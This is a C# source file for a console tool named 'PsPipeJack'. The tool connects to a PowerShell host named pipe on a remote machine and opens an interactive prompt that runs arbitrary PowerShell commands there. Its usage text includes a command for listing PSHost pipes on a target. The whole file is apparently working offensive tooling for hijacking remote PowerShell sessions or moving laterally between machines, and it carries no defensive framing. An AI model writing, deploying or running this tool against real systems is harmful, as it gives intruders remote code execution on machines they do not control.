using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: PsPipeJack <serverName> <pipeName>");
            Console.WriteLine();
            Console.WriteLine("Arguments:");
            Console.WriteLine("  serverName   IP address or hostname of the remote machine");
            Console.WriteLine("  pipeName     Name of the PowerShell named pipe on the remote machine");
            Console.WriteLine();
            Console.WriteLine("Example:");
            Console.WriteLine("  PsPipeJack 192.168.1.100 PSHost.134214327377452265.6880.DefaultAppDomain.powershell");
            Console.WriteLine();
            Console.WriteLine("Tip: To list available pipes on a remote machine, run:");
            Console.WriteLine("  [System.IO.Directory]::GetFiles(\"\\\\\\\\<serverName>\\\\pipe\\\\\") | Where-Object { $_ -like \"*PSHost*\" }");
            return;
        }

        string serverName = args[0];
        string pipeName = args[1];

        Console.WriteLine($"Connecting to \\\\{serverName}\\pipe\\{pipeName} ...");

        var connInfo = new NamedPipeConnectionInfo(pipeName)
        {
            ServerName = serverName
        };

        using var runspace = RunspaceFactory.CreateRunspace(connInfo);

        try
        {
            runspace.Open();
            Console.WriteLine("Connected! Type 'exit' to quit.\n");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Connection failed: {ex.Message}");
            return;
        }

        using var ps = PowerShell.Create();
        ps.Runspace = runspace;

        while (true)
        {
            Console.Write("PS> ");
            string input = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(input))
                continue;

            if (input.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase))
                break;

            ps.Commands.Clear();
            ps.AddScript(input);

            try
            {
                var results = ps.Invoke();

                foreach (var result in results)
                {
                    if (result != null)
                        Console.WriteLine(result.ToString());
                }

                // Print any errors
                if (ps.Streams.Error.Count > 0)
                {
                    foreach (var error in ps.Streams.Error)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"ERROR: {error}");
                        Console.ResetColor();
                    }
                    ps.Streams.Error.Clear();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Exception: {ex.Message}");
                Console.ResetColor();
            }
        }

        Console.WriteLine("Disconnected.");
    }
}
